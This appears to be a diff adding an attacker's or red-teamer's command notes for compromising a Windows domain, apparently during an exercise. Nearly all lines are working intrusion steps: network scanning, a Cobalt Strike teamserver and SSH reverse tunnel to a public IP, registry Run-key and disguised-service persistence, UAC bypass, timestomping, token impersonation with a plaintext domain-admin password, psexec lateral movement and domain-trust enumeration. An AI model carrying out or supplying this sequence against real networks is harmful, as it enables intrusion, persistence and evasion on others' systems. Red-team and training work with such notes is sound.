@@ -1,0 +1,48 @@
+nmap -sT 172.16.20.0/24 -T4 --top-ports 1000 -oA scanof_172.16.20.0.0-24 -n
+
+ dnsrecon -t rvl -n 172.16.20.10 --xml /root/Desktop/dnsrecon -r 172.16.20.0/24
+
+ 
+ .
+ REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "C:\MyAppPath\MyApp.exe"
+ 
+ https://172.30.100.8:8006/
+
+ ---------
+
+ ~/cobaltstrike# ./teamserver 74.28.31.46 josh1
+
+root@kali:~/cobaltstrike# ./cobaltstrike
+
+ssh -R 74.28.31.46:443:127.0.0.1:443 root@74.28.31.46
+
+run macro
+
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "win6413" /t REG_SZ /F /D "C:\Users\guy.fleegman\AppData\local\Temp\win6413.exe"
+
+//del..... need to be in same  reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v win6413  /f
+
+
+shell shutdown /r /t 0 /f
+
+runas SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX c:\users\Public\WIN6414.exe
+
+bypassuac
+
+//remind..... create sc exe payload
+shell sc create WIN6414 binpath= "C:\Windows\System32\WIN6414.exe" start= auto DisplayName= "windows x6414 manager"
+
+shell sc description WIN6414 "This is for Nick and Wimpy to see my service"
+shell sc start WIN6414
+timestomp WIN6414.exe desktop.ini
+
+//remind..... must get domain&user first
+make_token SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX
+
+psexec_psh 172.16.20.194
+172.16.20.194
+
+shell dsquery.exe * -filter "(objectclass=computer)" -attr * -limit 2
+SPRWS-19.spr.ershon.local or 172.16.20.144
+
+shell dsquery.exe * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection
